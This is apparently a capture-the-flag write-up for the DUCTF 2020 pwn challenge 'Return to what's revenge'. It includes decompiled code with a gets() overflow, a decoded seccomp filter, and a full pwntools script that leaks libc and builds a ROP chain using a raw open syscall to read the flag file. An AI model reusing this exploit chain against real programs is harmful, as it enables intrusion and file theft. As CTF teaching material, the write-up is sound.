# Table of Contents
1. [Author](#Author)
2. [CTF](#CTF)
3. [Category](#Category)
4. [Challenge Name](#Challenge-Name)
5. [Challenge Points](#Challenge-Points)
6. [Attachments](#Attachments)
7. [Challenge Description](#Challenge-Description)
8. [Solution](#Solution)

# Author
0x534b aka m0n0

# CTF
DUCTF 2020

# Category
pwn

# Challenge Name
Return to what's revenge

# Challenge Points
442 pts

# Challenge Description
My friends kept making fun of me, so I hardened my program even further!

The flag is located at /chal/flag.txt.

`nc chal.duc.tf 30006`

# Attachments
## return-to-whats-revenge
```
return-to-whats-revenge: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=85709e2a953fc6f7da43f29d1dee0c5cc682a059, with debug_info, not stripped
```
ghidra decompilation:
```c
void setup(void)
{
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  signal(0xe,handler); // prints "Time's up"
  alarm(0x1e);
  sandbox();
  return;
}

void sandbox(void)
{
  long i;
  bpf_labels *lab_ptr;
  sock_fprog prog;
  sock_filter filter [25];
  bpf_labels lab;
  
  i = 0x201;
  lab_ptr = &lab;
  while (i != 0) {
    i = i + -1;
    *(undefined8 *)lab_ptr = 0;
    lab_ptr = (bpf_labels *)lab_ptr->labels;
  }
  filter[0].code = 0x20;
  filter[0].jt = '\0';
  filter[0].jf = '\0';
  filter[0].k = 4;

 ...

  filter[24].code = 6;
  filter[24].jt = '\0';
  filter[24].jf = '\0';
  filter[24].k = 0;
  bpf_resolve_jumps(&lab,filter,0x19);
  prog.len = 0x19;
  prog.filter = filter;
  prctl(0x26,1,0,0,0);
  prctl(0x16,2,&prog);
  return;
}

int main(void)
{
  puts("Today, we\'ll have a lesson in returns.");
  vuln();
  return 0;
}

void vuln(void)
{
  char name [40];
  
  puts("Where would you like to return to?");
  gets(name);
  return;
}
```

# Solution
## The Program
At first glance, this challenge looks fairly simple. It uses the libc `gets` function to read user input onto the buffer `name` on the stack. However, there's something weird going on in that sandbox function...

## The Exploit
Let's try a classic ret2libc attack. First, we can see from both `ghidra`'s decompilation of the `vuln` function and from `checksec` (a utility included in `pwntools`) that there's no stack canary:
```
[*] '/ctf/ductf20/return-to-whats-revenge'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

We can also see that it has PIE disabled and the program always loads into memory with a base address of 0x400000. So, lets call `puts@plt` on a couple global offset table entries (namely `__libc_start_main@got` and `alarm@got`) to leak their addresses. Next, we can paste these into a [libc database](https://libc.nullbyte.cat/) and find the challenge server is using `libc6_2.27-3ubuntu1_amd64.so`.

From here we can build our exploit to leak a libc address, then use that address to calculate others and use them in a second payload:
```python
# payload 1 (the leak)
pop rdi ; ret
__libc_start_main@got
puts@plt
main # come back around for a second payload using the initial leak

# payload 2 (the shell)
pop rdi ; ret
binsh_string # found in libc
execve # in libc
```

Aaaaaaand... `SYGSIS`??

## The Program - Take 2
So, the program crashed with a `SYGSIS, Bad system call`. Stepping through the ROPchain in `gdb` we find that this crash occurs at this instruction:
```
<execve+5>     syscall
```
We aren't allowed to use the `execve` syscall? After searching up a few datatypes found in the `sandbox` function, I found something called [seccomp](https://en.wikipedia.org/wiki/Seccomp). Basically, this allows the program to choose which syscalls to allow and which ones to block.

Which syscalls *are* we allowed to use? I found a utility on GitHub called [seccomp-tools](https://github.com/david942j/seccomp-tools) which, given the binary, can find the syscall filter (in `sandbox`) and decode it. So let's try it:
```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0022
 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0022: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x06 0x00 0x00 0x00000000  return KILL
```

It looks like we are allowed to use the `rt_sigreturn`, `exit_group`, `exit`, `open`, `read`, `write`, `brk`, `mmap`, `mprotect`, and `close` syscalls. What stands out the most here is the `open` syscall, which lets us open a file. If we remember from the challenge description, we are specifically given the path for the flag file : `/chal/flag.txt`.

## The Exploit - For Real This Time

So, let's create a ROPchain to `read` the filename from `stdin`, `open` the file, `read` the file into memory, and `puts` the file to `stdout`. Our exploit should look something like this:
```python
# Payload 1 - leak libc

# puts(__libc_start_main@got)
pop rdi ; ret
__libc_start_main@got
puts@plt
main


# Payload 2 - print the flag file

# read(0, writeable_buffer, len(flag_path)) (0 is stdin)
pop rdi ; ret
0x0
pop rsi ; ret
writeable_buffer
pop rdx ; ret
len(flag_path)
read

# fd = open(writeable_buffer, 0) (0 is O_RDONLY) (fd is put into rax)
pop rdi ; ret
writeable_buffer
pop rsi ; ret
0x0
open

# read(fd, writeable_buf, 64)
mov rdi, rax ; ret
pop rsi ; ret
writeable_buffer
pop rdx ; ret
64 # at least the length of the flag (any reasonably large number)
read

# puts(writeable_buf)
pop rdi ; ret
writeable_buffer
puts@plt
```

One obstacle I came across when trying to put this ROPchain together was that across the executable and libc I could not find a `mov rdi rax ; ret` gadget or similar. I ended up having to put that together something like this:
```python
push rax ; pop rbx ; ret
pop rdx ; ret
0x0
test edx, edx ; jne <some_address> ; ret
mov rdi, rbx ; jne <some_address> ; pop rbx ; ret
<padding>
```

Anyway, now that we have that, let's try the exploit!

Wait what. `SIGSYS`.

So, it turns out that this libc's implementation of the `open` function, `open64`, does not use the `open` syscall. Instead, it uses the slightly different `openat` syscall. Hmm, I guess we'll have to call the syscall manually:
```python
# the open syscall's number is 2
pop rax ; ret
0x2
syscall ; ret
```

Finally, here's my exploit script:
```python
#!/usr/bin/env python3

# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./return-to-whats-revenge
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./return-to-whats-revenge')
libc = None
host = "chal.duc.tf"
port = 30006

def local(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        p = process([exe.path] + argv, *a, **kw)
        # print the pid so I can attach a debugger
        print(p.pid)
        input()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''

    global one_gadget, libc

    if args.LOCAL:
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        return local(argv, *a, **kw)
    else:
        libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')
        return remote(host, port)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

offset = 56
pop_rdi = 0x00000000004019db
flag_path = '/chal/flag.txt'

io = start()

log.info(f"opening msg: {repr(io.recv())}")

# puts(__libc_start_main@got)
pl = b'A'*offset
pl += p64(pop_rdi)
pl += p64(exe.got['__libc_start_main'])
pl += p64(exe.plt['puts'])

pl += p64(exe.sym['main'])

io.sendline(pl)

# parse leak
res = io.recvuntil(b'\n')
lsm = u64(res[:-1].ljust(8, b'\x00'))
libc.address = lsm - libc.sym['__libc_start_main']
log.info(f'__libc_start_main: {hex(libc.sym["__libc_start_main"])}')

log.info(f"opening msg: {repr(io.recv())}")

# writeable area in the executable's .data section
writeable_buf = 0x404010

# libc ropgadgets
pop_rdi = libc.address + 0x000000000002155f
pop_rsi_pop_r15 = 0x00000000004019d9
pop_rdx = libc.address + 0x0000000000001b96
pop_rax = libc.address + 0x00000000000439c8
push_rax_pop_rbx = libc.address + 0x0000000000052240
mov_rdi_rbx_jne_pop_rbx = libc.address + 0x000000000019a689
syscall = libc.address + 0x00000000000d2975
test_edx_edx_jne = libc.address + 0x000000000008331f

# gadgets in different places on my local libc
if args.LOCAL:
    pop_rax = libc.address + 0x0000000000043a78
    push_rax_pop_rbx = libc.address + 0x00000000000522e0
    syscall = libc.address + 0x00000000000d29d5
    test_edx_edx_jne = libc.address + 0x000000000008338f
    mov_rdi_rbx_jne_pop_rbx = libc.address + 0x000000000019a8f9

pl = b'A'*offset

# read(0, writeable_buf, len(flag_path)) (0 is stdin)
pl += p64(pop_rdi)
pl += p64(0x0)
pl += p64(pop_rsi_pop_r15)
pl += p64(writeable_buf)
pl += b'B'*8
pl += p64(pop_rdx)
pl += p64(len(flag_path))
pl += p64(libc.sym['read'])

# open(writeable_buf, 0) (0 is O_RDONLY)
pl += p64(pop_rdi)
pl += p64(writeable_buf)
pl += p64(pop_rsi_pop_r15)
pl += p64(0x0)
pl += b'B'*8
pl += p64(pop_rax)
pl += p64(0x2) # open
pl += p64(syscall)

# move previous return (rax) to rdi
pl += p64(push_rax_pop_rbx)
pl += p64(pop_rdx)
pl += p64(0x0)
pl += p64(test_edx_edx_jne)
pl += p64(mov_rdi_rbx_jne_pop_rbx)
pl += b'B'*8

# read(fd, writeable_buf)
pl += p64(pop_rsi_pop_r15)
pl += p64(writeable_buf)
pl += b'B'*8
pl += p64(pop_rdx)
pl += p64(64)
pl += p64(libc.sym['read'])

# puts(writeable_buf)
pl += p64(pop_rdi)
pl += p64(writeable_buf)
pl += p64(exe.plt['puts'])

io.sendline(pl)

io.sendline(flag_path)

io.interactive()
``` 

Let's run it!
```
[*] '/ctf/ductf20/return-to-whats-revenge'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loading gadgets for '/ctf/ductf20/return-to-whats-revenge'
[*] '/ctf/ductf20/libc6_2.27-3ubuntu1_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to chal.duc.tf on port 30006: Done
[*] opening msg: b"Today, we'll have a lesson in returns.\nWhere would you like to return to?\n"
[*] __libc_start_main: 0x7f38d55ffab0
[*] opening msg: b"Today, we'll have a lesson in returns.\nWhere would you like to return to?\n"
[*] Switching to interactive mode
DUCTF{secc0mp_noT_$tronk_eno0Gh!!@}
8\x7f
[*] Got EOF while reading in interactive
```